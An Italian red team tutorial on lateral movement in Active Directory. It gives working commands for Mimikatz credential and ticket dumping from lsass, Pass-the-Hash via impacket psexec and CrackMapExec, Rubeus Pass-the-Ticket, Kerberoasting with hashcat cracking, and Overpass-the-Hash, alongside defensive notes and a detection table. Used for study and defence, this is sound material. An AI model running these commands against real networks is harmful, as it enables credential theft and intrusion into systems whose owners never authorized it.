# Lateral Movement: tecniche Red Team su Active Directory

## Introduzione

Il **lateral movement** è una delle fasi più critiche di un red team engagement. Una volta ottenuto un primo accesso (*initial foothold*) all'interno di una rete, l'obiettivo diventa spostarsi verso sistemi più interessanti — controller di dominio, server di backup, workstation di amministratori.

In questo articolo vediamo le tecniche più usate in ambienti **Windows Active Directory**, gli strumenti associati e alcune note di detection per chi è dalla parte del Blue Team.

---

## Prerequisiti

Questa guida assume che tu abbia già:

- Un accesso iniziale a una macchina della rete (es. shell da phishing, RCE su app esposta)
- Credenziali valide di un utente di dominio (anche a basso privilegio)
- Un ambiente di test autorizzato (non fare queste cose su reti altrui)

---

## 1. Pass-the-Hash (PtH)

**Pass-the-Hash** sfrutta il fatto che Windows, in molti scenari, autentica gli utenti usando direttamente l'hash NTLM della password, senza richiedere la password in chiaro.

### Come funziona

Quando un utente si autentica su Windows, il sistema salva l'hash NTLM in memoria (nel processo `lsass.exe`). Se riusciamo a dumpare questo hash, possiamo usarlo al posto della password.

### Dump con Mimikatz

```powershell
# Richiede privilegi SYSTEM o SeDebugPrivilege
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

L'output mostrerà qualcosa del genere:

```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
UserName          : administrator
Domain            : CORP
NTLM              : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### Utilizzo dell'hash

```bash
# Con impacket (Linux)
python3 psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator@192.168.1.10

# Con CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

> **Nota difensiva:** Windows Defender Credential Guard, abilitato su Windows 10/11 e Server 2016+, impedisce il dump delle credenziali da lsass in molti scenari. È una delle migliori difese contro PtH.

---

## 2. Pass-the-Ticket (PtT)

**Pass-the-Ticket** funziona con il protocollo **Kerberos**. Invece di un hash NTLM, rubiamo un ticket Kerberos (`.kirbi`) dalla memoria e lo importiamo nella nostra sessione.

### Dump dei ticket

```powershell
# Dump di tutti i ticket in memoria
mimikatz.exe "sekurlsa::tickets /export" "exit"

# Alternativa: Rubeus
Rubeus.exe dump /nowrap
```

### Import e utilizzo

```powershell
# Con Mimikatz
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Con Rubeus
Rubeus.exe ptt /ticket:BASE64_TICKET
```

Una volta importato il ticket, puoi accedere alle risorse di rete come se fossi l'utente a cui appartiene il ticket.

---

## 3. Kerberoasting

**Kerberoasting** è una tecnica offline: richiediamo ticket Kerberos per account di servizio (SPN), poi proviamo a craccarli offline senza generare troppo rumore.

### Come funziona

Gli account di servizio in AD hanno un attributo `servicePrincipalName` (SPN). Qualsiasi utente autenticato può richiedere un TGS per questi account — il ticket è cifrato con l'hash della password del service account.

```powershell
# Enumerazione degli SPN con PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Richiesta e dump con Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Con impacket da Linux
python3 GetUserSPNs.py -request -dc-ip 192.168.1.1 CORP/utente:password
```

### Cracking offline

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

> **Nota difensiva:** Usa password lunghe (25+ caratteri) per i service account, oppure considera i **Managed Service Accounts (MSA/gMSA)** che ruotano automaticamente le password.

---

## 4. Overpass-the-Hash

Una via di mezzo tra PtH e PtT: usiamo l'hash NTLM per richiedere un ticket Kerberos TGT, e poi usiamo quel ticket per muoverci.

```powershell
# Mimikatz
mimikatz.exe "sekurlsa::pth /user:administrator /domain:CORP /ntlm:HASH /run:cmd.exe" "exit"

# Rubeus
Rubeus.exe asktgt /user:administrator /rc4:HASH /ptt
```

---

## Rilevamento (Blue Team notes)

| Tecnica | Event ID Windows | Segnale |
|---|---|---|
| Pass-the-Hash | 4624 (Logon Type 3) | Logon con hash, nessuna password in chiaro |
| Pass-the-Ticket | 4768, 4769 | TGT/TGS richiesti da IP insoliti |
| Kerberoasting | 4769 | Molte richieste TGS per SPN in poco tempo |
| Mimikatz | 4688 | Processo lsass acceduto da processo non standard |

---

## Conclusione

Il lateral movement in AD è un'area vastissima. Queste sono solo le tecniche più note — esistono anche DCSync, Golden/Silver Ticket, ACL abuse e molto altro.

L'importante, sia lato offensivo che difensivo, è capire il funzionamento di Kerberos e NTLM in profondità. La maggior parte degli attacchi sfrutta comportamenti legittimi del protocollo — non vere vulnerabilità.

Nel prossimo articolo entrerò nel dettaglio di **DCSync** e privilege escalation verso Domain Admin.
